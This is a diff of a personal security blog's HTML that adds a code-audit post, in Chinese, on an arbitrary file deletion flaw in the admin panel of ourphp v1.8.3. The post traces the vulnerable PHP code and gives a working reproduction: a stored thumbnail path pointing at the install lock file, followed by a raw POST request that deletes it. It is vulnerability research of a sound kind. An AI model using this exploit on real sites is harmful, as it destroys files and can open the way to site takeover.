@@ -93,7 +93,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="w1mps'w1mps'w1mps" />
+  <meta name="keywords" content="code audit," />
 
 
 
@@ -109,16 +109,18 @@
 
 
 
-<meta name="description" content="山前未见，山后不逢">
-<meta property="og:type" content="website">
-<meta property="og:title" content="w1mps的草稿箱">
-<meta property="og:url" content="http://w1mps.github.io/page/2/index.html">
+<meta name="description" content="ourphp v1.8.3 后台任意文件删除">
+<meta name="keywords" content="code audit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="百日维新(12&#x2F;100)">
+<meta property="og:url" content="http://w1mps.github.io/2018/09/30/keep_100_12/keep_100_12/index.html">
 <meta property="og:site_name" content="w1mps的草稿箱">
-<meta property="og:description" content="山前未见，山后不逢">
+<meta property="og:description" content="ourphp v1.8.3 后台任意文件删除">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-30T12:58:20.440Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="w1mps的草稿箱">
-<meta name="twitter:description" content="山前未见，山后不逢">
+<meta name="twitter:title" content="百日维新(12&#x2F;100)">
+<meta name="twitter:description" content="ourphp v1.8.3 后台任意文件删除">
 
 
 
@@ -147,13 +149,13 @@
 
 
 
-  <link rel="canonical" href="http://w1mps.github.io/page/2/"/>
+  <link rel="canonical" href="http://w1mps.github.io/2018/09/30/keep_100_12/keep_100_12/"/>
 
 
 
 
 
-  <title>w1mps的草稿箱</title>
+  <title>百日维新(12/100) | w1mps的草稿箱</title>
   
 
 
@@ -183,9 +185,7 @@
   
   
     
-  <div class="container sidebar-position-left 
-   page-home 
- ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -322,9 +322,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -337,7 +337,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://w1mps.github.io/2018/09/13/keep_100_02/keep_100_02/">
+    <link itemprop="mainEntityOfPage" href="http://w1mps.github.io/2018/09/30/keep_100_12/keep_100_12/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="w1mps">
@@ -354,9 +354,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/13/keep_100_02/keep_100_02/" itemprop="url">百日维新(2/100)</a></h1>
+          <h1 class="post-title" itemprop="name headline">百日维新(12/100)</h1>
         
 
         <div class="post-meta">
@@ -368,8 +366,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-13T20:44:44+08:00">
-                2018-09-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T16:44:44+08:00">
+                2018-09-30
               </time>
             
 
@@ -428,16 +426,19 @@
       
 
       
-        
-          <p>MetInfo6.0.0后台任意文件读取下载<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/13/keep_100_02/keep_100_02/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <p>ourphp v1.8.3 后台任意文件删除<br><a id="more"></a><br>简单的说一下流程<br>在<code>client/manage/ourphp_photoedit.php</code>中，我们关注以下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$OP_Photoimg = str_replace($ourphp[&apos;webpath&apos;].&quot;function&quot;,&quot;function&quot;,admin_sql($_POST[&quot;OP_Photoimg&quot;]));</span><br><span class="line">...</span><br><span class="line">$query = $db -&gt; update(&quot;`ourphp_photo`&quot;,&quot;`OP_Phototitle` = &apos;&quot;.admin_sql($_POST[&quot;OP_Phototitle&quot;]).&quot;&apos;,`time` = &apos;&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;&apos;,`OP_Photocminimg` = &apos;&quot;.$ourphp_xiegang.&quot;&apos;,`OP_Photoimg` = &apos;&quot;.$OP_img.&quot;&apos;,`OP_Photocontent` = &apos;&quot;.admin_sql($_POST[&quot;OP_Photocontent&quot;]).&quot;&apos;,`OP_Class` = &apos;&quot;.$OP_Photoclass[0].&quot;&apos;,`OP_Lang` = &apos;&quot;.$OP_Photoclass[1].&quot;&apos;,`OP_Tag` = &apos;&quot;.$wordtag.&quot;&apos;,`OP_Sorting` = &apos;&quot;.admin_sql($_POST[&quot;OP_Photosorting&quot;]).&quot;&apos;,`OP_Attribute` = &apos;&quot;.$OP_Photoattribute.&quot;&apos;,`OP_Url` = &apos;&quot;.admin_sql($_POST[&quot;OP_Photourl&quot;]).&quot;&apos;,`OP_Description` = &apos;&quot;.compress_html($OP_Photocontent).&quot;&apos;,`OP_Photoname` = &apos;&quot;.admin_sql($OP_Photoname).&quot;&apos;&quot;,&quot;where id = &quot;.intval($_GET[&quot;id&quot;]));</span><br></pre></td></tr></table></figure></p>
+<p>重点就是这两行代码，一个将POST进来的图片地址赋值给<code>$OP_Photoimg</code>，第二步更新到数据库中。</p>
+<p>接下来来到<code>client/manage/ourphp_cmd.php</code>中，重点关注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#125;elseif($_POST[&quot;lx&quot;]==&quot;s&quot;)&#123;</span><br><span class="line"></span><br><span class="line">	$op_b = explode(&apos;,&apos;,$_POST[&quot;id&quot;]);</span><br><span class="line">	include &apos;./ourphp_del.php&apos;;</span><br><span class="line">	...</span><br><span class="line">	&#125;elseif($_POST[&quot;xx&quot;]==&quot;photo&quot;)&#123;</span><br><span class="line">		</span><br><span class="line">		for($i = 0; $i &lt; count($op_b); $i ++)&#123;</span><br><span class="line">			$ourphp_rs = $db -&gt; select(&quot;`OP_Photocminimg`,`OP_Photoimg`&quot;,&quot;`ourphp_photo`&quot;,&quot;where id = &quot;.intval($op_b[$i]));</span><br><span class="line">			if($ourphp_rs[0] != &apos;&apos; || $ourphp_rs[1] != &apos;&apos;)&#123;</span><br><span class="line">				ourphp_imgdel($ourphp_rs[0],&apos;&apos;,$ourphp_rs[1]);</span><br><span class="line">			&#125;</span><br><span class="line">			$query = $db -&gt; del(&quot;ourphp_photo&quot;,&quot;where id = &quot;.intval($op_b[$i]));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
+<p>很显然了，这里将<code>ourphp_photo</code>中的数据带出来，但是呢，并没有验证路径是否是合理的就带入到了ourphp_imgdel函数中，跟进到函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function ourphp_imgdel($minimg=&apos;&apos;,$maximg=&apos;&apos;,$imgimg=&apos;&apos;)&#123;</span><br><span class="line">	global $db;</span><br><span class="line">	$ourphp_rs = $db -&gt; select(&quot;`OP_Webfile`&quot;,&quot;`ourphp_webdeploy`&quot;,&quot;where id = 1&quot;);</span><br><span class="line">	if($ourphp_rs[0] == 2)&#123;</span><br><span class="line">		if($minimg != &apos;&apos;)&#123;</span><br><span class="line">			if (file_exists(&apos;../../&apos;.$minimg))&#123;</span><br><span class="line">				unlink(&apos;../../&apos;.$minimg);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if($maximg != &apos;&apos;)&#123;</span><br><span class="line">			if (file_exists(&apos;../../&apos;.$maximg))&#123;</span><br><span class="line">				unlink(&apos;../../&apos;.$maximg);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if($imgimg != &apos;&apos;)&#123;</span><br><span class="line">			$img = explode(&apos;|&apos;,$imgimg);</span><br><span class="line">			foreach($img as $op)&#123;</span><br><span class="line">				$delimg .= unlink(&apos;../../&apos;.$op);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &apos;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里首先有一个前提条件，就是OP_Webfile在表中值为2，这个在后台全局-网站功能管理中 选中 <strong>当删除数据时连同附件一起删除</strong>，然后就可以直接删掉了。</p>
+<p>验证：</p>
+<ol>
+<li>前往<code>http://localhost/client/manage/ourphp_photoedit.php?id=1</code> 修改缩略图地址为需要删除的，这里演示以重装锁为例，所以输入<code>function/install/ourphp.lock</code></li>
+<li>构造payload包： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /client/manage/ourphp_cmd.php?ourphp_cms=cmd HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 62</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.9 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1537801311990; PHPSESSID=fju4eandpo6n5fjj2u4f8tpvi4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">id=1&amp;xx=photo&amp;lx=s&amp;Submit=%E7%A1%AE%E5%AE%9A%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>即可删除任意文件了</p>
+
       
     </div>
     
@@ -452,309 +453,36 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://w1mps.github.io/2018/09/12/keep_100_01/keep_100_01/keep_100_01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="w1mps">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/avatar/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1mps的草稿箱">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/12/keep_100_01/keep_100_01/keep_100_01/" itemprop="url">百日维新(1/100)</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-12T20:44:44+08:00">
-                2018-09-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code-audit/" itemprop="url" rel="index">
-                    <span itemprop="name">code audit</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/code-audit/" rel="tag"><i class="fa fa-tag"></i> code audit</a>
           
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <p>Metinfo6.0.0后台sql注入<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/12/keep_100_01/keep_100_01/keep_100_01/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/22/keep_100_11/keep_100_11/" rel="next" title="百日维新(11/100)">
+                <i class="fa fa-chevron-left"></i> 百日维新(11/100)
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://w1mps.github.io/2018/09/12/CSS3-note/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="w1mps">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/avatar/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1mps的草稿箱">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/12/CSS3-note/" itemprop="url">从零开始</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+          <div class="post-nav-prev post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-12T08:44:44+08:00">
-                2018-09-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/misc/" itemprop="url" rel="index">
-                    <span itemprop="name">misc</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-          
-
-          
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/12/CSS3-note/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -764,14 +492,11 @@
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -779,6 +504,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -980,10 +709,10 @@
   
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
